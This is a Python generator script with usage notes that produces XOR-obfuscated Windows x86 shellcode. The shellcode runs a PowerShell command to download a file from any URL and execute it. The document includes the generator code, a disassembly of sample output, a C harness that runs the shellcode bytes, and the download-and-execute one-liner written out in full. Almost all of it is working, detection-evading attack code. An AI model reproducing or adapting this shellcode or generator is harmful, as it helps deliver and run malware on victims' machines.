#Title: Obfuscated Shellcode Windows x86/x64 Download And Execute [Use PowerShell] - Generator
#length: Dynamic ! depend on url and filename
#Date: 20 January 2015
#Author: Ali Razmjoo
#tested On: Windows 7 x64 ultimate
#WinExec =>  0x77b1e695
#ExitProcess =>  0x77ae2acf
#====================================
#Execute :
#powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://tartarus.org/~simon/putty-prerel-snapshots/x86/putty.exe', 'D:\Ali.exe')};D:\Ali.exe"
#====================================
#Ali Razmjoo , ['Ali.Razmjoo1994@Gmail.Com','Ali@Z3r0D4y.Com']
#Thanks to my friends , Dariush Nasirpour and Ehsan Nezami
####################################################
#How it work ?
'''
C:\Users\Ali\Desktop>python "Windows x86 Download And Execute.py"
Enter url
Example: http://z3r0d4y.com/file.exe
Enter:http://tartarus.org/~simon/putty-prerel-snapshots/x86/putty.exe
Enter filename
Example: D:\file.exe
Enter:C:\Ali.exe
C:\Users\Ali\Desktop>nasm -f elf shellcode.asm -o shellcode.o
C:\Users\Ali\Desktop>objdump -D shellcode.o
shellcode.o:     file format elf32-i386
Disassembly of section .text:
00000000 <.text>:
   0:   31 c0                   xor    %eax,%eax
   2:   50                      push   %eax
   3:   68 41 41 65 22          push   $0x22654141
   8:   58                      pop    %eax
   9:   c1 e8 08                shr    $0x8,%eax
   c:   c1 e8 08                shr    $0x8,%eax
   f:   50                      push   %eax
  10:   b8 34 47 0b 4d          mov    $0x4d0b4734,%eax
  15:   bb 5d 69 6e 35          mov    $0x356e695d,%ebx
  1a:   31 d8                   xor    %ebx,%eax
  1c:   50                      push   %eax
  1d:   b8 43 32 10 22          mov    $0x22103243,%eax
  22:   bb 79 6e 51 4e          mov    $0x4e516e79,%ebx
  27:   31 d8                   xor    %ebx,%eax
  29:   50                      push   %eax
  2a:   b8 60 05 42 32          mov    $0x32420560,%eax
  2f:   bb 49 78 79 71          mov    $0x71797849,%ebx
  34:   31 d8                   xor    %ebx,%eax
  36:   50                      push   %eax
  37:   b8 0f 1c 2c 14          mov    $0x142c1c0f,%eax
  3c:   bb 6a 64 49 33          mov    $0x3349646a,%ebx
  41:   31 d8                   xor    %ebx,%eax
  43:   50                      push   %eax
  44:   b8 07 3e 0b 40          mov    $0x400b3e07,%eax
  49:   bb 46 52 62 6e          mov    $0x6e625246,%ebx
  4e:   31 d8                   xor    %ebx,%eax
  50:   50                      push   %eax
  51:   b8 44 0a 78 07          mov    $0x7780a44,%eax
  56:   bb 63 49 42 5b          mov    $0x5b424963,%ebx
  5b:   31 d8                   xor    %ebx,%eax
  5d:   50                      push   %eax
  5e:   b8 0f 16 4b 0d          mov    $0xd4b160f,%eax
  63:   bb 6a 31 67 2d          mov    $0x2d67316a,%ebx
  68:   31 d8                   xor    %ebx,%eax
  6a:   50                      push   %eax
  6b:   b8 18 62 5c 1f          mov    $0x1f5c6218,%eax
  70:   bb 61 4c 39 67          mov    $0x67394c61,%ebx
  75:   31 d8                   xor    %ebx,%eax
  77:   50                      push   %eax
  78:   b8 1b 2d 1e 1f          mov    $0x1f1e2d1b,%eax
  7d:   bb 6b 58 6a 6b          mov    $0x6b6a586b,%ebx
  82:   31 d8                   xor    %ebx,%eax
  84:   50                      push   %eax
  85:   b8 45 40 41 66          mov    $0x66414045,%eax
  8a:   bb 3d 78 77 49          mov    $0x4977783d,%ebx
  8f:   31 d8                   xor    %ebx,%eax
  91:   50                      push   %eax
  92:   b8 02 1f 4b 45          mov    $0x454b1f02,%eax
  97:   bb 6d 6b 38 6a          mov    $0x6a386b6d,%ebx
  9c:   31 d8                   xor    %ebx,%eax
  9e:   50                      push   %eax
  9f:   b8 24 3e 19 32          mov    $0x32193e24,%eax
  a4:   bb 45 4e 6a 5a          mov    $0x5a6a4e45,%ebx
  a9:   31 d8                   xor    %ebx,%eax
  ab:   50                      push   %eax
  ac:   b8 00 5e 3a 35          mov    $0x353a5e00,%eax
  b1:   bb 6c 73 49 5b          mov    $0x5b49736c,%ebx
  b6:   31 d8                   xor    %ebx,%eax
  b8:   50                      push   %eax
  b9:   b8 1f 37 40 24          mov    $0x2440371f,%eax
  be:   bb 6d 52 32 41          mov    $0x4132526d,%ebx
  c3:   31 d8                   xor    %ebx,%eax
  c5:   50                      push   %eax
  c6:   b8 2e 35 68 31          mov    $0x3168352e,%eax
  cb:   bb 5a 4c 45 41          mov    $0x41454c5a,%ebx
  d0:   31 d8                   xor    %ebx,%eax
  d2:   50                      push   %eax
  d3:   b8 48 1e 1c 15          mov    $0x151c1e48,%eax
  d8:   bb 67 6e 69 61          mov    $0x61696e67,%ebx
  dd:   31 d8                   xor    %ebx,%eax
  df:   50                      push   %eax
  e0:   b8 26 28 0d 5d          mov    $0x5d0d2826,%eax
  e5:   bb 4f 45 62 33          mov    $0x3362454f,%ebx
  ea:   31 d8                   xor    %ebx,%eax
  ec:   50                      push   %eax
  ed:   b8 20 57 1d 45          mov    $0x451d5720,%eax
  f2:   bb 47 78 63 36          mov    $0x36637847,%ebx
  f7:   31 d8                   xor    %ebx,%eax
  f9:   50                      push   %eax
  fa:   b8 04 6a 24 3b          mov    $0x3b246a04,%eax
  ff:   bb 77 44 4b 49          mov    $0x494b4477,%ebx
 104:   31 d8                   xor    %ebx,%eax
 106:   50                      push   %eax
 107:   b8 18 0f 0a 32          mov    $0x320a0f18,%eax
 10c:   bb 6c 6e 78 47          mov    $0x47786e6c,%ebx
 111:   31 d8                   xor    %ebx,%eax
 113:   50                      push   %eax
 114:   b8 7d 18 3c 27          mov    $0x273c187d,%eax
 119:   bb 52 6c 5d 55          mov    $0x555d6c52,%ebx
 11e:   31 d8                   xor    %ebx,%eax
 120:   50                      push   %eax
 121:   b8 03 44 60 60          mov    $0x60604403,%eax
 126:   bb 77 34 5a 4f          mov    $0x4f5a3477,%ebx
 12b:   31 d8                   xor    %ebx,%eax
 12d:   50                      push   %eax
 12e:   b8 47 6b 1f 20          mov    $0x201f6b47,%eax
 133:   bb 6f 4c 77 54          mov    $0x54774c6f,%ebx
 138:   31 d8                   xor    %ebx,%eax
 13a:   50                      push   %eax
 13b:   b8 2a 5e 2b 20          mov    $0x202b5e2a,%eax
 140:   bb 6c 37 47 45          mov    $0x4547376c,%ebx
 145:   31 d8                   xor    %ebx,%eax
 147:   50                      push   %eax
 148:   b8 59 07 12 0e          mov    $0xe120759,%eax
 14d:   bb 35 68 73 6a          mov    $0x6a736835,%ebx
 152:   31 d8                   xor    %ebx,%eax
 154:   50                      push   %eax
 155:   b8 01 59 11 2c          mov    $0x2c115901,%eax
 15a:   bb 45 36 66 42          mov    $0x42663645,%ebx
 15f:   31 d8                   xor    %ebx,%eax
 161:   50                      push   %eax
 162:   b8 22 22 4e 5a          mov    $0x5a4e2222,%eax
 167:   bb 4c 56 67 74          mov    $0x7467564c,%ebx
 16c:   31 d8                   xor    %ebx,%eax
 16e:   50                      push   %eax
 16f:   b8 00 37 1b 48          mov    $0x481b3700,%eax
 174:   bb 43 5b 72 2d          mov    $0x2d725b43,%ebx
 179:   31 d8                   xor    %ebx,%eax
 17b:   50                      push   %eax
 17c:   b8 4a 1f 22 13          mov    $0x13221f4a,%eax
 181:   bb 64 48 47 71          mov    $0x71474864,%ebx
 186:   31 d8                   xor    %ebx,%eax
 188:   50                      push   %eax
 189:   b8 6a 23 03 18          mov    $0x1803236a,%eax
 18e:   bb 4a 6d 66 6c          mov    $0x6c666d4a,%ebx
 193:   31 d8                   xor    %ebx,%eax
 195:   50                      push   %eax
 196:   b8 2d 54 57 1c          mov    $0x1c57542d,%eax
 19b:   bb 47 31 34 68          mov    $0x68343147,%ebx
 1a0:   31 d8                   xor    %ebx,%eax
 1a2:   50                      push   %eax
 1a3:   b8 4e 15 36 5a          mov    $0x5a36154e,%eax
 1a8:   bb 39 38 79 38          mov    $0x38793839,%ebx
 1ad:   31 d8                   xor    %ebx,%eax
 1af:   50                      push   %eax
 1b0:   b8 59 7f 1f 04          mov    $0x41f7f59,%eax
 1b5:   bb 79 57 51 61          mov    $0x61515779,%ebx
 1ba:   31 d8                   xor    %ebx,%eax
 1bc:   50                      push   %eax
 1bd:   b8 47 56 1d 2f          mov    $0x2f1d5647,%eax
 1c2:   bb 65 70 3d 54          mov    $0x543d7065,%ebx
 1c7:   31 d8                   xor    %ebx,%eax
 1c9:   50                      push   %eax
 1ca:   b8 2c 18 08 54          mov    $0x5408182c,%eax
 1cf:   bb 4d 76 6c 74          mov    $0x746c764d,%ebx
 1d4:   31 d8                   xor    %ebx,%eax
 1d6:   50                      push   %eax
 1d7:   b8 5a 34 58 1b          mov    $0x1b58345a,%eax
 1dc:   bb 39 5b 35 76          mov    $0x76355b39,%ebx
 1e1:   31 d8                   xor    %ebx,%eax
 1e3:   50                      push   %eax
 1e4:   b8 3f 0f 4b 41          mov    $0x414b0f3f,%eax
 1e9:   bb 53 63 6b 6c          mov    $0x6c6b6353,%ebx
 1ee:   31 d8                   xor    %ebx,%eax
 1f0:   50                      push   %eax
 1f1:   b8 4a 1e 59 0b          mov    $0xb591e4a,%eax
 1f6:   bb 38 6d 31 6e          mov    $0x6e316d38,%ebx
 1fb:   31 d8                   xor    %ebx,%eax
 1fd:   50                      push   %eax
 1fe:   b8 49 2b 16 2a          mov    $0x2a162b49,%eax
 203:   bb 39 44 61 4f          mov    $0x4f614439,%ebx
 208:   31 d8                   xor    %ebx,%eax
 20a:   50                      push   %eax
 20b:   89 e0                   mov    %esp,%eax
 20d:   bb 41 41 41 01          mov    $0x1414141,%ebx
 212:   c1 eb 08                shr    $0x8,%ebx
 215:   c1 eb 08                shr    $0x8,%ebx
 218:   c1 eb 08                shr    $0x8,%ebx
 21b:   53                      push   %ebx
 21c:   50                      push   %eax
 21d:   bb 95 e6 b1 77          mov    $0x77b1e695,%ebx
 222:   ff d3                   call   *%ebx
 224:   bb cf 2a ae 77          mov    $0x77ae2acf,%ebx
 229:   ff d3                   call   *%ebx
C:\Users\Ali\Desktop>
#you have your shellcode now
=======================================
shellcode.c
#include <stdio.h>
#include <string.h>
int main(){
unsigned char shellcode[]= "\x31\xc0\x50\x68\x41\x41\x65\x22\x58\xc1\xe8\x08\xc1\xe8\x08\x50\xb8\x34\x47\x0b\x4d\xbb\x5d\x69\x6e\x35\x31\xd8\x50\xb8\x43\x32\x10\x22\xbb\x79\x6e\x51\x4e\x31\xd8\x50\xb8\x60\x05\x42\x32\xbb\x49\x78\x79\x71\x31\xd8\x50\xb8\x0f\x1c\x2c\x14\xbb\x6a\x64\x49\x33\x31\xd8\x50\xb8\x07\x3e\x0b\x40\xbb\x46\x52\x62\x6e\x31\xd8\x50\xb8\x44\x0a\x78\x07\xbb\x63\x49\x42\x5b\x31\xd8\x50\xb8\x0f\x16\x4b\x0d\xbb\x6a\x31\x67\x2d\x31\xd8\x50\xb8\x18\x62\x5c\x1f\xbb\x61\x4c\x39\x67\x31\xd8\x50\xb8\x1b\x2d\x1e\x1f\xbb\x6b\x58\x6a\x6b\x31\xd8\x50\xb8\x45\x40\x41\x66\xbb\x3d\x78\x77\x49\x31\xd8\x50\xb8\x02\x1f\x4b\x45\xbb\x6d\x6b\x38\x6a\x31\xd8\x50\xb8\x24\x3e\x19\x32\xbb\x45\x4e\x6a\x5a\x31\xd8\x50\xb8\x00\x5e\x3a\x35\xbb\x6c\x73\x49\x5b\x31\xd8\x50\xb8\x1f\x37\x40\x24\xbb\x6d\x52\x32\x41\x31\xd8\x50\xb8\x2e\x35\x68\x31\xbb\x5a\x4c\x45\x41\x31\xd8\x50\xb8\x48\x1e\x1c\x15\xbb\x67\x6e\x69\x61\x31\xd8\x50\xb8\x26\x28\x0d\x5d\xbb\x4f\x45\x62\x33\x31\xd8\x50\xb8\x20\x57\x1d\x45\xbb\x47\x78\x63\x36\x31\xd8\x50\xb8\x04\x6a\x24\x3b\xbb\x77\x44\x4b\x49\x31\xd8\x50\xb8\x18\x0f\x0a\x32\xbb\x6c\x6e\x78\x47\x31\xd8\x50\xb8\x7d\x18\x3c\x27\xbb\x52\x6c\x5d\x55\x31\xd8\x50\xb8\x03\x44\x60\x60\xbb\x77\x34\x5a\x4f\x31\xd8\x50\xb8\x47\x6b\x1f\x20\xbb\x6f\x4c\x77\x54\x31\xd8\x50\xb8\x2a\x5e\x2b\x20\xbb\x6c\x37\x47\x45\x31\xd8\x50\xb8\x59\x07\x12\x0e\xbb\x35\x68\x73\x6a\x31\xd8\x50\xb8\x01\x59\x11\x2c\xbb\x45\x36\x66\x42\x31\xd8\x50\xb8\x22\x22\x4e\x5a\xbb\x4c\x56\x67\x74\x31\xd8\x50\xb8\x00\x37\x1b\x48\xbb\x43\x5b\x72\x2d\x31\xd8\x50\xb8\x4a\x1f\x22\x13\xbb\x64\x48\x47\x71\x31\xd8\x50\xb8\x6a\x23\x03\x18\xbb\x4a\x6d\x66\x6c\x31\xd8\x50\xb8\x2d\x54\x57\x1c\xbb\x47\x31\x34\x68\x31\xd8\x50\xb8\x4e\x15\x36\x5a\xbb\x39\x38\x79\x38\x31\xd8\x50\xb8\x59\x7f\x1f\x04\xbb\x79\x57\x51\x61\x31\xd8\x50\xb8\x47\x56\x1d\x2f\xbb\x65\x70\x3d\x54\x31\xd8\x50\xb8\x2c\x18\x08\x54\xbb\x4d\x76\x6c\x74\x31\xd8\x50\xb8\x5a\x34\x58\x1b\xbb\x39\x5b\x35\x76\x31\xd8\x50\xb8\x3f\x0f\x4b\x41\xbb\x53\x63\x6b\x6c\x31\xd8\x50\xb8\x4a\x1e\x59\x0b\xbb\x38\x6d\x31\x6e\x31\xd8\x50\xb8\x49\x2b\x16\x2a\xbb\x39\x44\x61\x4f\x31\xd8\x50\x89\xe0\xbb\x41\x41\x41\x01\xc1\xeb\x08\xc1\xeb\x08\xc1\xeb\x08\x53\x50\xbb\x95\xe6\xb1\x77\xff\xd3\xbb\xcf\x2a\xae\x77\xff\xd3";
fprintf(stdout,"Length: %d\n\n",strlen(shellcode));
    (*(void(*)()) shellcode)();
}
=======================================
C:\Users\Ali\Desktop>gcc shellcode.c -o shellcode.exe
C:\Users\Ali\Desktop>shellcode.exe
Length: 173
C:\Users\Ali\Desktop>
#notice : when program exit, you must wait 2-3 second , it will finish download and execute file after 2-3 second
'''
import random,binascii
chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789=[]-'
p1 = '''xor eax,eax
push eax
'''
p2 = '''
mov eax,esp
mov ebx,0x01414141
shr ebx,0x08
shr ebx,0x08
shr ebx,0x08
push ebx
push eax
mov ebx,0x77b1e695
call ebx
mov ebx,0x77ae2acf
call ebx
'''
sen1 = str(raw_input('Enter url\nExample: http://z3r0d4y.com/file.exe \nEnter:'))
sen1 = sen1.rsplit()
sen1 = sen1[0]
sen2 = str(raw_input('Enter filename\nExample: D:\\file.exe\nEnter:'))
sen2 = sen2.rsplit()
sen2 = sen2[0]
sen = '''powershell -command "& { (New-Object Net.WebClient).DownloadFile('%s', '%s')};%s"''' %(sen1,sen2,sen2)
m = 0
for word in sen:
        m += 1
m = m - 1
stack = ''
while(m>=0):
        stack += sen[m]
        m -= 1
stack = stack.encode('hex')
skip = 1
if len(stack) % 8 == 0:
        skip = 0
if skip is 1:
        stack = '00' + stack
        if len(stack) % 8 == 0:
                skip = 0
        if skip is 1:
                stack = '00' + stack
                if len(stack) % 8 == 0:
                        skip = 0
        if skip is 1:
                stack = '00' + stack
                if len(stack) % 8 == 0:
                        skip = 0
if len(stack) % 8 == 0:
        zxzxzxz = 0
m = len(stack) / 8
c = 0
n = 0
z = 8
shf = open('shellcode.asm','w')
shf.write(p1)
shf.close()
shf = open('shellcode.asm','a')
while(c<m):
        v = 'push 0x' + stack[n:z]
        skip = 0
        if '0x000000' in v:
                skip = 1
                q1 = v[13:]
                v = 'push 0x' + q1 + '414141' + '\n' + 'pop eax\nshr eax,0x08\nshr eax,0x08\nshr eax,0x08\npush eax\n'
        if '0x0000' in v:
                skip = 1
                q1 = v[11:]
                v = 'push 0x' + q1 + '4141' + '\n' + 'pop eax\nshr eax,0x08\nshr eax,0x08\npush eax\n'
        if '0x00' in v:
                skip = 1
                q1 = v[9:]
                v = 'push 0x' + q1 + '41' + '\n' + 'pop eax\nshr eax,0x08\npush eax\n'
        if skip is 1:
                shf.write(v)
        if skip is 0:
                v = v.rsplit()
                zzz = ''
                for w in v:
                        if '0x' in w:
                                zzz = str(w)
                s1 = binascii.b2a_hex(''.join(random.choice(chars) for i in range(4)))
                s1 = '0x%s'%s1
                data = "%x" % (int(zzz, 16) ^ int(s1, 16))
                v =  'mov eax,0x%s\nmov ebx,%s\nxor eax,ebx\npush eax\n'%(data,s1)
                shf.write(v)
        n += 8
        z += 8
        c += 1
shf.write(p2)
shf.close()